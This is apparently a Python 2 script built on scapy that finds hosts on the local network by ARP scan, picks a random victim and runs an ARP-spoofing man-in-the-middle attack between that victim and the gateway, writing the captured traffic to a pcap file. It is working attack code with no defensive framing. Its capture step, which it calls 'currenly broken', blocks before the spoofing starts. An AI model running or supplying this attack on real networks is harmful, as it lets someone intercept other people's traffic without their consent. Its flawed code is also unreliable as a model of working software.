import os
import re
import time
import socket
import struct
import random
from scapy.all import *
from datetime import datetime as dt
from threading import Thread

interfaces = ['en0', 'en1']
clients = []

def get_subnet_mask(mask):
    # Convert the mask to an integer
    mask_int = int(mask, 16)

    # Convert the mask to dotted decimal format
    mask_dotted = socket.inet_ntoa(struct.pack('>I', mask_int))

    return mask_dotted

def scan_network(gateway, subnet):

    # Convert subnet mask to CIDR notation
    cidr = sum(bin(int(x)).count('1') for x in subnet.split('.'))
    ip_range = '{}{}'.format(gateway, '/{}'.format(cidr))

    arp = ARP(pdst=ip_range)
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp

    result = srp(packet, timeout=2, verbose=0)[0]

    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

def attack():
    global clients

    # Get the MAC address of the default gateway
    gateway_mac = next((client['mac'] for client in clients if client['ip'] == gateway_ip), None)
    if gateway_mac is None:
        print 'Could not find gateway MAC address'
        return

    print 'Gateway MAC address: {}'.format(gateway_mac)
    print

    # Choose a random client to attack
    candidates = [client for client in clients if client['mac'] != gateway_mac]
    if not candidates:
        print 'No other Clients found'
        return

    target = random.choice(candidates)

    print 'Target IP address: {}'.format(target['ip'])
    print 'Target MAC address: {}'.format(target['mac'])
    print

    # Store the original MAC addresses
    original_gateway_mac = gateway_mac
    original_target_mac = target['mac']
    
    # Start capturing
    print 'Enabling capture, currenly broken... press Ctrl-C to continue!'
    filename = dt.now().strftime('%Y-%m-%d-%H-%M-%S') + '.pcap'
    sniff(filter='ip host {} or host {}'.format(gateway_ip, target['ip']), prn=lambda x: wrpcap(filename, x))
    
    # Start actual attack
    print 'Starting ARP spoofing attack in...',
    time.sleep(1)
    print '3...',
    time.sleep(1)
    print '2...',
    time.sleep(1)
    print '1...'
    print 'Press Ctrl-C to stop the attack'
    print

    try:
        while True:
            # Send ARP reply packets to both the target and the gateway
            # to convince them that the MAC address of the other device is at our interface
            send(ARP(op=2, pdst=target['ip'], psrc=gateway_ip, hwdst=target['mac']))
            send(ARP(op=2, pdst=gateway_ip, psrc=target['ip'], hwdst=gateway_mac))

            #print 'Doing something...'
            time.sleep(5)

    except KeyboardInterrupt:
        print 'Stopping the attack...'

        # Send ARP reply packets with the original MAC addresses to both the target and the gateway
        for number in range(4):
            send(ARP(op=2, pdst=target['ip'], psrc=gateway_ip, hwdst=original_target_mac))
            send(ARP(op=2, pdst=gateway_ip, psrc=target['ip'], hwdst=original_gateway_mac))

for iface in interfaces:
    # Get local IP, MAC address, and subnet mask for the current interface
    output = os.popen('ifconfig %s' % iface).read()
    local_ip_match = re.search('inet (.*?)\s', output)
    local_mac_match = re.search('ether (.*?)\s', output)
    subnet_mask_match = re.search('netmask (.*?)\s', output)

    if local_ip_match:
        local_ip = local_ip_match.group(1)
        local_mac = local_mac_match.group(1)
        subnet_mask = subnet_mask_match.group(1)

        # Get default gateway IP address
        output = os.popen('netstat -rn').read()
        gateway_ip_match = re.search('default\s+(.*?)\s', output)

        if gateway_ip_match:
            gateway_ip = gateway_ip_match.group(1)

            print("Interface: %s" % iface)
            print("Local IP address: %s" % local_ip)
            print("Local MAC address: %s" % local_mac)
            print("Subnet mask: %s" % get_subnet_mask(subnet_mask))
            print("Gateway IP address: %s" % gateway_ip)
            print("\n")

            # Perform ARP scan to get IP and MAC addresses of devices on the network
            scan_network(gateway_ip, get_subnet_mask(subnet_mask))

            # Perform target selection
            attack()
